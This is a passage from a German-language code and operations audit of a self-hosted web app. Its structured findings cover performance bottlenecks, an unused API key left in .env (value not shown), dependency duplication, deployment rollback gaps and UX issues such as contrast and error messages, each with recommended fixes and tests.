**Geschaetzter Umfang:** Small-Medium
**Risiko bei der Umsetzung:** Low

### P-014 Antwortgroessen: Terminal-Snapshot, Preview-Collect, File-Search

**Kategorie:** Performance (Serialisierung/Batching)
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** Medium Confidence
**Betroffene Dateien:** `apps/server/src/terminal/snapshots.ts:27-117`, `.../previews/gateway.ts:507-524,655-665`, `.../filesystem/fileManagerService.ts` (SEARCH_LIMIT 250/DEPTH 6/TIMEOUT 3 s — vorbildlich)
**Betroffene Funktionen oder Komponenten:** `snapshotHistory` + `headless.snapshot()` + `journal.deltasAfter`; `collect(stream, 2MB)`-Puffer pro Request
**Problembeschreibung:** Terminal-Sync sendet Snapshot + Deltas (grosser Scrollback = MBs). Preview-Injektion puffert bis 2 MB synchron ohne Backpressure (Fallback `send(stream)` nur bei `announced`).
**Technische Ursache:** Korrektheit vor Cap.
**Ausloeser:** Viele Terminals/Previews.
**Auswirkungen:** Speicher-Spikes.
**Warum es leicht uebersehen wird:** File-Search-Limits daneben wirken „ueberall begrenzt".
**Empfohlene Loesung:** Snapshot-Cap (letzte 100 kB + `deltasAfter`); Preview bei Ueberschreitung immer streamen statt puffern.
**Betroffene Architekturentscheidungen:** Snapshot-Protokoll (Geometrie-Logik `Manager.ts:108-120` bleibt).
**Alternativen:** Nur Preview-Fallback ausweiten — Trade-off: Terminal bleibt.
**Trade-offs:** TUI-Zerreiss-Risiko (mittel).
**Implementierungsschritte:** 1. Cap. 2. Stream-Fallback. 3. Snapshot-Test grosses Scrollback.
**Tests:** WS-Frame-Groessen; Heap bei 10 Terminals; p95 Snapshot <200 kB.
**Akzeptanzkriterien:** Kein TUI-Zerreissen.
**Abhaengigkeiten:** Keine.
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Medium

### P-015 Blockierendes FS im Event-Loop

**Kategorie:** Performance (Blockierung)
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `.../orbit/database.ts:159-193,271`, `.../extensions/catalog.ts:44-133`, `.../notifications/t3-status-sync.ts:112,291,298`, `.../observability/audit.ts:143-163`, `.../system/restart.ts:27,77-104`
**Betroffene Funktionen oder Komponenten:** `writeFileSync/readFileSync/readdirSync/statSync` im Request-/Startup-Pfad (Orbit-Backup im Save-Pfad!)
**Problembeschreibung:** Sync-APIs blockieren Single-Thread ms–100 ms bei grossen Verzeichnissen/Docs.
**Technische Ursache:** Einfachheit; meist Startup/Cursor — aber Orbit-Backup im Save-Pfad.
**Ausloeser:** 4-MB-Save; grosse Kataloge.
**Auswirkungen:** Latenz-Spitzen unter Last.
**Warum es leicht uebersehen wird:** Sync-Calls „funktionieren"; Lag nur unter Last.
**Empfohlene Loesung:** Orbit-Backup + Catalog-Scan auf `fs/promises`; Cursor-IO cachen.
**Betroffene Architekturentscheidungen:** IO-Disziplin (async ausser Boot).
**Alternativen:** Nur Orbit-Backup — Trade-off: Rest bleibt.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Async-Umstellung. 2. Cursor-Cache. 3. Bench 4-MB-Save.
**Tests:** Event-Loop-Lag (`monitorEventLoopDelay`), Ziel p95 <30 ms.
**Akzeptanzkriterien:** Keine API-Aenderung.
**Abhaengigkeiten:** P-011 (Backup-Pfad gemeinsam).
**Geschaetzter Umfang:** Small-Medium
**Risiko bei der Umsetzung:** Low

### P-016 N+1 im Filesystem (`lstat+access` pro Entry)

**Kategorie:** Performance (Batching)
**Schweregrad:** Low-Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `.../filesystem/projectBrowserService.ts:97-120`, `.../filesystem/fileManagerService.ts:72-120`
**Betroffene Funktionen oder Komponenten:** `entries.slice(offset,offset+limit)` (Paging gut: 300/Default, max 500; Cursor; `de`-Sort) aber `Promise.all(page.map(lstat+access))` = bis 600 Syscalls/Req
**Problembeschreibung:** Korrekt (Symlink-/Permission-Check) vor Perf; keine `Dirent`-Abkuerzung.
**Technische Ursache:** Check pro Entry.
**Ausloeser:** `tree?limit=300` in grossem Ordner.
**Auswirkungen:** p95 linear mit `limit`.
**Warum es leicht uebersehen wird:** Pagination existiert — Syscall-Count unsichtbar.
**Empfohlene Loesung:** Default 300→100 grosse Ordner; `access` nur bei Bedarf (lazy); `readdir withFileTypes` dokumentieren.
**Betroffene Architekturentscheidungen:** Keine (Tuning).
**Alternativen:** Keine.
**Trade-offs:** Gering (gleiche Fehler-Codes).
**Implementierungsschritte:** 1. Default. 2. Lazy-Check. 3. Bench 5k-Files (Ziel <500 ms).
**Tests:** Bench synthetischer Ordner.
**Akzeptanzkriterien:** Gleiche `FILESYSTEM_*`-Codes.
**Abhaengigkeiten:** Keine.
**Geschaetzter Umfang:** Small
**Risiko bei der Umsetzung:** Low

### P-017 Reconnect-Sturm nach Backend-Restart

**Kategorie:** Performance (Realtime/Skalierung)
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** Medium Confidence
**Betroffene Dateien:** `.../app/lifecycle.ts:14-43`, `.../notifications/*-sync.ts:33,83,141`, `.../previews/DevServerManager.ts:274`, `.../terminal/process.ts:144,197,211`
**Betroffene Funktionen oder Komponenten:** 7 Starter ohne Jitter; sekündliches `health`-Pollen waehrend Restart; WS-Reconnect deterministisch
**Problembeschreibung:** Alle Tabs pollen sekündlich (`bootId`/`webBuildId`), WS reconnecten deterministisch → Herd → 429/Busy-Spitze (1200-Budget geteilt).
**Technische Ursache:** Schneller Reconnect-Wunsch ohne Staffelung.
**Ausloeser:** Jeder `wrapt.service`-Restart.
**Auswirkungen:** 429 nach Restart bei vielen Tabs.
**Warum es leicht uebersehen wird:** Ein Tab reconnectet „sofort gut".
**Empfohlene Loesung:** Jitter (`+Math.random()*1000`, wie Orbit-Retry); `health`-Poll waehrend Restart 2 s + Backoff; `restart/status`-Longpoll statt 1-s-Poll.
**Betroffene Architekturentscheidungen:** Restart-Erkennung (≤5 s bleiben).
**Alternativen:** Nur Jitter — Trade-off: Poll-Last bleibt.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Jitter. 2. Poll-Backoff. 3. Longpoll. 4. Restart-Simulation E2E.
**Tests:** 10 Tabs → 0×429 nach Restart; Erkennung ≤5 s.
**Akzeptanzkriterien:** Wie Tests.
**Abhaengigkeiten:** P-004/P-009.
**Geschaetzter Umfang:** Small
**Risiko bei der Umsetzung:** Low

### B-001 Tote Mistral-Reste + Secret in `.env` (MISTRAL_API_KEY) — CRITICAL

**Kategorie:** Build/Deployment/Secrets (Entfernung statt Rotation — Mistral wird nicht mehr benutzt)
**Schweregrad:** Critical (solange der Key in `.env` liegt)
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `.env:20-29` („Tech TLDRs"-Block: `MISTRAL_API_KEY=<echter Key>`, `MISTRAL_API_BASE_URL`, `MISTRAL_MODEL_INGEST/CHAT/EMBED`, `NEWS_SYNC_INTERVAL_MS`, `NEWS_FETCH_TIMEOUT_MS`, `NEWS_MAX_ITEMS_PER_SOURCE`, `NEWS_AI_CONCURRENCY`; dazu stale `APP_VERSION=0.97.0` vs `package.json:2.2.9`, alter `DATABASE_PATH`), `docs/configuration.md:165-183` (Hermes-Modell-Beispiel mit `fallback_providers: [custom:api.mistral.ai]`), `plans/extension-platform-v1-inventory.md:440,644-646` (News-Service-/Env-Tabelle), `deploy/systemd/units/wrapt.service.template:14` (`EnvironmentFile`, bleibt — laedt weiter die uebrigen Vars), `apps/server/src/config/settings.ts:22-27`
**Betroffene Funktionen oder Komponenten:** Keine im Code — News-/Mistral-Sync ist seit Release 1.8.0 entfernt („Tech-News und TLDR-Ansichten samt API entfernt"); Repo-Grep findet null Leser von `MISTRAL_*`/`NEWS_*` in `apps/`, `packages/`, `scripts/`
**Problembeschreibung:** Obwohl kein Code die Variablen liest, liegt ein echter, gueltig aussehender `MISTRAL_API_KEY` im Klartext in `.env` (600, gitignored — gut) und wird via `EnvironmentFile` in jeden Service-Prozess injiziert (`process.env`). Daneben verwaiste `MISTRAL_*`/`NEWS_*`-Zeilen, ein Doku-Beispiel mit Mistral-Fallback und eine veraltete Inventar-Tabelle.
**Technische Ursache:** Feature entfernt (1.8.0), aber `.env`-Block + Doku-/Plan-Referenzen nie mit aufgeraeumt.
**Ausloeser:** Dauerhaft aktiv (Key liegt da, Umgebungs-Exposure bei jedem Prozess-Start).
**Beispielszenario:** Log-Dump/`systemctl show`/Backup/Screenshot leakt den Key; ungenutzter Key wird nie rotiert/deaktiviert und bleibt als Angriffs-/Kostenflaeche beim Anbieter bestehen.
**Auswirkungen:** Leak-Risiko, Missbrauch des Anbieter-Kontos, tote Config irrefuehrt Diagnose (B-005-Drift).
**Warum es leicht uebersehen wird:** 600 + gitignored wirken „sicher"; Feature-Wegfall stand im Changelog, `.env`-Aufraeumen nicht.
**Empfohlene Loesung:** 1. Key beim Anbieter deaktivieren/loeschen (keine Rotation noetig — wird nicht mehr benutzt). 2. `.env`-Block Zeilen 20–29 ersatzlos loeschen (Datei behalten, Rest bleibt). 3. `docs/configuration.md`-Beispiel: Mistral-Fallback durch neutralen Platzhalter-Anbieter ersetzen. 4. `plans/extension-platform-v1-inventory.md:440,644-646` streichen/aktualisieren. 5. CHANGELOG + Release-Notes bleiben Historie (nicht anfassen). 6. Grep-Regression: `mistral`/`MISTRAL_` ausserhalb CHANGELOG/Release-Notes/Audit-Historie = 0.
**Betroffene Architekturentscheidungen:** Keine neue Secret-Ablage noetig (Entfernung statt Credential-Umzug).
**Alternativen:** Rotieren + Credential-Umzug (alte Planfassung) — Trade-off: ueberfluessig, da ungenutzt; vom Betreiber explizit verworfen.
**Trade-offs:** Gering (reine Loeschung, kein Code betroffen; Anbieter-Deaktivierung ausserhalb Repo).
**Implementierungsschritte:** 1. Anbieter-Key deaktivieren. 2. `.env`-Block loeschen. 3. Doku-Beispiel neutralisieren. 4. Inventar-Zeilen streichen. 5. Grep-Assert + CI-Grep (nur Namen, nie Werte).
**Tests:** `grep -ri mistral` (ausser Historie) leer; `systemctl --user show wrapt.service | grep -i mistral` leer; `.env` ohne Block; `security:audit`.
**Akzeptanzkriterien:** Kein `MISTRAL_*`/`NEWS_*` in `.env`/Code/Doku (ausser CHANGELOG-Historie); Key beim Anbieter deaktiviert.
**Abhaengigkeiten:** Keine (sofort, unabhaengig).
**Geschaetzter Umfang:** Small
**Risiko bei der Umsetzung:** Low

### B-002 Vite `loadEnv(mode,"../..","")` laedt alle Vars (heute ungefaehrlich, morgen riskant)

**Kategorie:** Build (Env dev/prod)
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/web/vite.config.ts:25-38`, `.env`, `.env.example`
**Betroffene Funktionen oder Komponenten:** `loadEnv(..., "")`, `define` (nur `__WRAPT_APP_VERSION__`)
**Problembeschreibung:** Leerer Prefix laedt alles aus `.env` in den Vite-Prozess (nach B-001 kein Mistral-Secret mehr vorhanden; nicht ins Bundle — verifiziert, nur Version im `define`). Aber jeder kuenftige `import.meta.env.*`-Zugriff wuerde leaken. `VITE_`-Konvention nicht erzwungen.
**Technische Ursache:** Bequemlichkeit fuer Proxy-Config.
**Ausloeser:** Zukuenftiger Env-Zugriff.
**Auswirkungen:** Latenter Leak-Pfad.
**Warum es leicht uebersehen wird:** Bundle heute sauber → „sicher".
**Empfohlene Loesung:** Prefix auf `WRAPT_` einschraenken; Regressionstest `grep -r MISTRAL dist/` leer (Mistral nach B-001 ohnehin entfernt — dient als Bleib-weg-Garantie).
**Betroffene Architekturentscheidungen:** Env-Prefix-Policy.
**Alternativen:** Nur Test ohne Prefix-Aenderung — Trade-off: halb.
**Trade-offs:** Gering (Proxy-Verhalten unveraendert).
**Implementierungsschritte:** 1. Prefix. 2. Filter. 3. Build-Assert.
**Tests:** Build-Assert `!dist/**/*.js contains MISTRAL`.
**Akzeptanzkriterien:** Proxy unveraendert; Bundle ohne Secrets (Test gruen).
**Abhaengigkeiten:** B-001.
**Geschaetzter Umfang:** Small
**Risiko bei der Umsetzung:** Low

### B-003 Doppelte/transitive Deps (`lucide`×3, `zustand`×3, `katex`×2)

**Kategorie:** Dependencies
**Schweregrad:** Medium-High
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `pnpm-lock.yaml` (59 Duplikate: `lucide-react 0.469/0.562/1.47`, `zustand 3.7.2/4.5.7/5.0.15`, `katex 0.16.47/0.18.7`, `highlight.js` ×2, `marked 17/18`, `undici 7/8`, `parse5 7/8`), `apps/web/package.json:16` (`@lobehub/icons ^5.18.0`), `.../components/icons/WorkbenchIcons.tsx:1` (einziger Import: `ClaudeCodeColor`)
**Betroffene Funktionen oder Komponenten:** Icon-/Editor-Stack
**Problembeschreibung:** Ein Icon zieht `@lobehub/ui` + `antd` + 3 `lucide`. `katex 0.16.47` via `rehype-katex`, `highlight 11.11.2` via `hermes-parser`, `marked 17` via `magicast`. `zustand`-Alt via alte Peer-Ranges. `^`-Ranges erlauben Drift (Lock pinnt, `update` springt).
**Technische Ursache:** Schwere transitive Baeume gepflegter Deps; Drag-Handle zieht `yjs`.
**Ausloeser:** Jeder Install/Update/Build.
**Auswirkungen:** Install-/Build-Zeit, Supply-Chain-Flaeche, Bundle (P-001/P-002).
**Warum es leicht uebersehen wird:** Direkte Deps „bewusst gewaehlt"; Transitive unsichtbar.
**Empfohlene Loesung:** `@lobehub/icons` → Inline-SVG (ein Import rechtfertigt kein `antd`); `pnpm dedupe`/Overrides fuer `katex/marked/undici`; `yjs` via `drag-handle-react` hinterfragen (nur `BlockMenu.tsx:2`); `depcheck`/`knip` + `pnpm licenses` als Warnung.
**Betroffene Architekturentscheidungen:** Icon-/Editor-Abhaengigkeiten.
**Alternativen:** Nur dedupe — Trade-off: lobehub bleibt.
**Trade-offs:** Icon-Tausch (mittel).
**Implementierungsschritte:** 1. SVG-Ersatz. 2. Dedupe/Overrides. 3. yjs-Pruefung. 4. Warn-Jobs.
**Tests:** `depcheck`/`knip`-Regression; Bundle-Visualizer; Install-Zeit.
**Akzeptanzkriterien:** Icon-Optik identisch; −1 `lucide`, −1 `zustand`, kein `antd` im Web-Graph.
**Abhaengigkeiten:** P-001/P-002.
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Medium

### B-004 Versionsbereiche + Lockfile-Hygiene (gut, ohne Update-Kadenz)

**Kategorie:** Dependencies
**Schweregrad:** Low
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `pnpm-workspace.yaml:9-15` (Overrides vorbildlich), `package.json` (pnpm 10.29.2), `.github/workflows/quality.yml` (frozen-lock)
**Betroffene Funktionen oder Komponenten:** 25+ `^`-Ranges im Web ohne Kadenz; `audit` nur high+prod
**Problembeschreibung:** Overrides pinnen CVEs, CI frozen — gut. Aber keine dokumentierte Update-Kadenz; moderate Advisories unsichtbar.
**Technische Ursache:** Fehlender Prozess.
**Ausloeser:** Zeit.
**Auswirkungen:** Surprise-Majors, stille Moderates.
**Warum es leicht uebersehen wird:** Gruene Pipeline = „aktuell".
**Empfohlene Loesung:** Monatlicher `pnpm update -r --latest --dry-run` + `audit --audit-level=moderate` als Advisory-Job (non-blocking); Override-Kommentare mit Advisory-Links.
**Betroffene Architekturentscheidungen:** Update-Prozess.
**Alternativen:** Keine.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Nightly-Job. 2. Kommentar-Links. 3. Kadenz-Doku.
**Tests:** `security:audit`-Step + Advisory-Job.
**Akzeptanzkriterien:** Keine Surprise-Majors; 0 high.
**Abhaengigkeiten:** Keine.
**Geschaetzter Umfang:** Small
**Risiko bei der Umsetzung:** Low

### B-005 Env-Drift dev/prod (`.env` stale, Guards gut)

**Kategorie:** Build (Env)
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `.env` vs `.env.example`, `apps/server/src/config/settings.ts:47-195` (Guards vorbildlich: Dev-User verboten in prod, Loopback-only Hosts)
**Betroffene Funktionen oder Komponenten:** Settings-Guards; `readAppVersion()`
**Problembeschreibung:** Guards stark. Aber `.env` mit `APP_VERSION=0.97.0` (ignoriert — verwirrend), `DATABASE_PATH` alt (`remote-workplace/` statt `wrapt/` via `wrapt.local.json`).
**Technische Ursache:** Historische Werte nie bereinigt.
**Ausloeser:** Doku-/Pfad-Verwirrung.
**Auswirkungen:** Falsche Annahmen bei Diagnose.
**Warum es leicht uebersehen wird:** Guards fangen Schlimmstes — Drift darunter unsichtbar.
**Empfohlene Loesung:** `.env` bereinigen (nur neutrale Werte wie `.example`); Pfade nur via `wrapt.local.json`; `APP_VERSION`-Zeile loeschen; Drift-Check in CI (Namen, nicht Werte).
**Betroffene Architekturentscheidungen:** Config-Quellen-Trennung.
**Alternativen:** Keine.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Bereinigung. 2. CI-Drift-Check. 3. Matrix-Test prod-Env.
**Tests:** Settings-Test prod-Matrix; `curl /health` Version == `package.json`.
**Akzeptanzkriterien:** Wie Tests.
**Abhaengigkeiten:** B-001 (gemeinsam).
**Geschaetzter Umfang:** Small
**Risiko bei der Umsetzung:** Low

### B-006 Deployment: kein Rollback, Health ohne Readiness, Migration ohne Ordnung

**Kategorie:** Deployment
**Schweregrad:** High
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/system/routes.ts:34-46`, `scripts/lib-restart.sh:174-315`, `scripts/restart-*.sh`, `deploy/systemd/units/wrapt.service.template:16-17`, `.../orbit/database.ts:126-128`, `.../usage/database.ts:30-100`, `.../notifications/database.ts:79-108`
**Betroffene Funktionen oder Komponenten:** `/health` (nur ok/version/bootId/webBuildId), `readiness`-Query (duenn), Restart-Pipeline, `IF NOT EXISTS`-Migrationen ohne Reihenfolge/Down
**Problembeschreibung:** Restart baut sichtbar (gut), dann `systemd-run` + Poll (gut). Aber kein Blue/Green, 5–20 s Downtime (`TimeoutStopSec 20s`), kein Auto-Rollback (nur `last-status.json` + Log), kein Start-Smoke, Migrationen ohne Ordnung/Down/VACUUM/Backup-Verifikation (ausser Orbit-Outbox), keine Staging-Slots.
**Technische Ursache:** Single-Host-Annahme ohne Cluster-Bedarf bisher.
**Ausloeser:** Fehlgeschlagener Start nach Build.
**Auswirkungen:** Downtime bis Fix.
**Warum es leicht uebersehen wird:** Build-vor-Restart faengt Baufehler — Startfehler danach ungesehen.
**Empfohlene Loesung:** Nach Build `node dist/index.js --check` (Import-Smoke) vor `systemd-run`; `/readiness` auf DB (`SELECT 1`), `index.html`-mtime, tmux-Socket, T3-Port ausbauen; Migrations-Reihenfolge dokumentieren; Backend-`dist.<bootId>` behalten (wie Frontend-Retention); VACUUM-Fenster nach Purge.
**Betroffene Architekturentscheidungen:** Restart-Sicherheit (Smoke + Rollback).
**Alternativen:** Nur Smoke ohne Rollback — Trade-off: erkennt, heilt nicht.
**Trade-offs:** Mittel (Systempfad).
**Implementierungsschritte:** 1. Smoke. 2. Readiness-Ausbau. 3. Doku Reihenfolge. 4. dist-Retention. 5. Downtime-Metrik.
**Tests:** `restart --dry-run`; Downtime (`bootId`-Delta), `failed`-Rate; Ziel p95 <10 s, 0 Starts ohne Smoke.
**Akzeptanzkriterien:** Fehlstart rollt auf vorheriges `dist/` zurueck.
**Abhaengigkeiten:** A-009, D-015.
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Medium

### B-007 CI/Qualitaet: stark, ohne Perf-Budget, niedrige Coverage-Schwellen

**Kategorie:** CI/Lint/TS
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `.github/workflows/quality.yml`, `apps/web/vite.config.ts:97-109` (Statements 38 %, Branches 35 %), `eslint.config.mjs:42-43` (`exhaustive-deps: warn`)
**Betroffene Funktionen oder Komponenten:** Pipeline (arch/file-lines/quality-gates/typecheck/eslint/build/test/coverage/artifact-retention/audit/E2E — vorbildlich)
**Problembeschreibung:** Kein Bundle-Budget, kein Lighthouse, kein Lasttest; `exhaustive-deps` nur Warnung → instabile Deps (P-005) schlüpfen; Schwellen erlauben ungetestete Perf-Pfade.
**Technische Ursache:** Fehlende Schwellen.
**Ausloeser:** PR mit +200 kB oder neuem `setInterval` ohne Cleanup faellt nicht auf.
**Auswirkungen:** Schleichende Regression.
**Warum es leicht uebersehen wird:** Pipeline gruen = „Qualitaet ok".
**Empfohlene Loesung:** `exhaustive-deps` auf `error` (mind. stores/views/Orbit); Bundle-Budget-Job (P-002); `audit moderate` als Advisory.
**Betroffene Architekturentscheidungen:** Quality-Gates.
**Alternativen:** Keine.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Regel hochstufen. 2. Budget-Job. 3. Advisory-Job.
**Tests:** Bestehende Jobs — Schwellen anheben.
**Akzeptanzkriterien:** PR mit +200 kB oder schmutzigem Interval faellt auf.
**Abhaengigkeiten:** P-002/P-005.
**Geschaetzter Umfang:** Small
**Risiko bei der Umsetzung:** Low

### B-008 Monitoring: In-Memory statt persistent, keine Slow-Query-/Bundle-Sicht

**Kategorie:** Monitoring
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/observability/metrics.ts`, `audit.ts`, `web-build-metrics.ts`, `.../services/systemService.ts:69-71` (`MAX_METRICS_HISTORY 25`)
**Betroffene Funktionen oder Komponenten:** `metricsHistory` (25 RAM), `operationalMetrics`/Audit ohne Alerting, kein APM/Slow-Query-Log/Bundle-Report
**Problembeschreibung:** Nur 25 Samples RAM; SQLite-`busy`/`slow` unsichtbar; kein Bundle-Report als CI-Artefakt.
**Technische Ursache:** Minimal-Observability.
**Ausloeser:** Dauerbetrieb.
**Auswirkungen:** p95 unsichtbar; schleichende Regression ohne Alarm.
**Warum es leicht uebersehen wird:** Dashboard zeigt Live-Werte — „Monitoring vorhanden".
**Empfohlene Loesung:** `slowQueryThresholdMs` (200 ms) loggen (ohne PII); History 100 + Persistenz via `operational_audit`; Bundle-Report als CI-Artefakt.
**Betroffene Architekturentscheidungen:** Metrik-Persistenz (mit Abschnitt 12).
**Alternativen:** Nur Log — Trade-off: kein Verlauf.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Slow-Log. 2. Persistenz. 3. Artefakt. 4. p95-Anzeige.
**Tests:** Audit-Test mit Slow-Assert; Ziel 0 Slow >500 ms/Tag.
**Akzeptanzkriterien:** Dashboard zeigt p95, nicht nur live.
**Abhaengigkeiten:** Abschnitt 12.
**Geschaetzter Umfang:** Small-Medium
**Risiko bei der Umsetzung:** Low

### 4c. Detailed Findings — Frontend/UX/Tests (U, Q)

### U-001 Kontrast `muted`/`faint` auf dunkler Basis grenzwertig

**Kategorie:** UX/A11y
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** Probable (Needs Verification via Messung)
**Betroffene Dateien:** `apps/web/src/index.css:36-38` (`--color-muted:#818181`, `--color-faint:#737373` auf `#0a0a0a`/`#111`), Nutzer u. a. `dash-vital-caption`, `dash-muted`, `notification-settings small`, `usage-*`
**Betroffene Funktionen oder Komponenten:** Sekundaertexte 10–13 px, Captions, Platzhalter
**Problembeschreibung:** Kleine Texte in `#737373` auf fast Schwarz schwer lesbar (1080p, mobil, geringe Helligkeit). Beispiel `Usage.tsx:171` („Noch kein erfolgreicher Abruf").
**Technische Ursache:** Bewusste Caption-Farbwahl ohne Kontrast-Validierung.
**Ausloeser:** Dashboard/Usage/Settings/Preview-Logs dunkel.
**Beispielszenario:** Sehschwacher Nutzer ueberliest Meta-Zeilen.
**Auswirkungen:** WCAG-AA-Risiko (1.4.3), Support-Aufwand.
**Warum es leicht uebersehen wird:** Designer-Monitor hell; Meta „soll" dezent sein.
**Empfohlene Loesung:** Paare messen (Axe/Playwright); `faint` nur ≥12 px/unwichtig, sonst `muted` hochziehen; nur Token in `@theme` (kein neues Hex).
**Betroffene Architekturentscheidungen:** Theme-Token-Werte.
**Alternativen:** Nur Doku — Trade-off: keine Abhilfe.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Axe-Scan. 2. Token anpassen. 3. Stichprobe 390 px + Desktop.
**Tests:** Axe Dashboard/Usage/Settings; visuelle Stichprobe.
**Akzeptanzkriterien:** Fließtext ≥4.5:1, Meta ≥3:1 dokumentiert.
**Abhaengigkeiten:** Keine.
**Geschaetzter Umfang:** Small
**Risiko bei der Umsetzung:** Low

### U-002 Neustart ohne Abbruch, erzwingt Reload, ignoriert Dirty-State

**Kategorie:** UX (Flow/Feedback)
**Schweregrad:** High
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/web/src/components/SystemRestartControls.tsx:27-87,103-110`, `views/settings/SettingsSystem.tsx`, `.../stores/orbit.ts` (`dirty`), `views/SkillEditor.tsx:82ff`, `components/orbit/OrbitToolbar.tsx:41`
**Betroffene Funktionen oder Komponenten:** `useSystemRestart` (Poll bis 5 Min, `RESTART_DEADLINE_MS`); Buttons `disabled` ohne „Abbrechen"
**Problembeschreibung:** Kein Abbruch (`cancelledRef` existiert, nur UI fehlt). Bei Erfolg immer `window.location.reload()` ohne Rueckfrage. Orbit/Skill/Notes/FileManager ohne `beforeunload`-Guard.
**Technische Ursache:** Fehlender Guard + fehlende UI-Verdrahtung.
**Ausloeser:** „Beides" waehrend Orbit dirty oder Skill-Tippen.
**Beispielszenario:** „Ungespeicherte Aenderung" sichtbar → versehentlich „Beides" → Reload; Entwurf muss rehydrieren, Filter/Scroll weg. Kritisch weil Restart die KI-Session killt (AGENTS-Hinweis).
**Auswirkungen:** Datenverlust-Gefuehl, Doppelarbeit.
**Warum es leicht uebersehen wird:** Restart selten; Poll-Logik getestet, UI-Pfad nicht.
**Empfohlene Loesung:** Abbrechen-Button; vor `reload()` Dirty-Check (Orbit/Skill/Notes) → ConfirmDialog „Trotzdem neu laden?"; `onJumpToRestart`-Fokus behalten.
**Betroffene Architekturentscheidungen:** Restart-UX (Cancel + Dirty-Gate).
**Alternativen:** Nur Cancel ohne Dirty-Check — Trade-off: halb.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Cancel-UI. 2. Dirty-Abfrage. 3. Confirm. 4. Unit+E2E.
**Tests:** Unit `useSystemRestart` (Erfolg/Failed/Timeout/Abbruch); E2E „Restart → Abbrechen → weiterarbeiten".
**Akzeptanzkriterien:** Abbruch <1,5 s wirksam; Reload nur nach Confirm wenn dirty.
**Abhaengigkeiten:** Q-003 (Restart-Tests).
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Low

### U-003 Fehlermeldungen zeigen Roh-`Error.message` ohne Loesungsweg

**Kategorie:** UX (Fehlertexte)
**Schweregrad:** High
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `components/QueryBoundary.tsx:34-40`, `views/DashboardPanels.tsx:42-49,62-64`, `views/PreviewHubProject.tsx:79,208`, `components/preview/LocalPreviewRuntime.tsx:231-237,353`, `lib/apiClient/transport.ts:46-54`
**Betroffene Funktionen oder Komponenten:** `PanelError/queryMessage`, `ApiClientError`, `actionError`
**Problembeschreibung:** `error.message` direkt gerendert. Zod-/Fetch-/Preview-Fehler technisch („Quarantaene…", „Slot…"). Nur generisches „Erneut versuchen", keine Anleitung (Diagnose? Slot-Wechsel? Doctor? Docs-Link `preview.config.json`). `requestId` nie angezeigt.
**Technische Ursache:** Fehlendes Fehler-Typ-Mapping.
**Ausloeser:** Backend-500, Zod-Mismatch nach Contract-Aenderung, Quarantaene, Offline.
**Beispielszenario:** „Der Reset konnte nicht verifiziert werden. Der Slot bleibt gesperrt." — Nutzer weiss nicht weiter.
**Auswirkungen:** Support-Tickets, Fehlversuche, Abbrueche.
**Warum es leicht uebersehen wird:** Deutsche `ApiClientError`-Texte wirken „fertig".
**Empfohlene Loesung:** Mapping (Netzwerk/Validierung/Quarantaene/Timeout) mit je Loesungszeile + Aktion (Diagnose oeffnen, Log kopieren, Docs-Link); `requestId` anzeigen („bei Meldung angeben").
**Betroffene Architekturentscheidungen:** Fehler-UX-Pattern (Titel + Ursache + Aktion + Retry ueberall).
**Alternativen:** Nur Texte verbessern — Trade-off: keine Aktionen.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Mapping. 2. Aktionen. 3. requestId. 4. Unit+E2E.
**Tests:** Unit `queryMessage`-Mapping; E2E 500→Retry (Projects-Muster auf Preview/Dashboard).
**Akzeptanzkriterien:** Jede Alert-Flaeche: Titel + Ursache + naechste Aktion + Retry.
**Abhaengigkeiten:** D-013/Q-004 (Codes/requestId).
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Low

### U-004 Browser-Zurueck schliesst Dialog; kein konsistentes Bottom-Sheet

**Kategorie:** UX (Navigation/Dialog)
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `components/ModalDialog.tsx:31-42,74-82`, `lib/useModalFocus.ts`, `index.css:754-756,848,1834,2605`, `components/workspaces/WorkspaceRegistryView.tsx:175`
**Betroffene Funktionen oder Komponenten:** `ModalFrame` (`pushState`/`popstate`), Fokus-Falle/`inert` (vorbildlich)
**Problembeschreibung:** Zurueck schliesst Dialog — korrekt, aber ohne Hinweis. Compact-`.modal-sheet` full-width ohne Griff/Swipe; Diagnose-/Login-Sheets als Bottom-Sheet gedacht, verhalten sich zentriert.
**Technische Ursache:** Fehlende Sheet-Standardisierung.
**Ausloeser:** Hardware-/Swipe-Zurueck bei offenem Dialog.
**Beispielszenario:** Workspace-Entfernen → Zurueck schliesst Confirm → „abgebrochen = entfernt?"-Verwirrung.
**Auswirkungen:** Verwirrung, Doppel-Oeffnungen.
**Warum es leicht uebersehen wird:** Schliessen „funktioniert"; Hinweis fehlt nur.
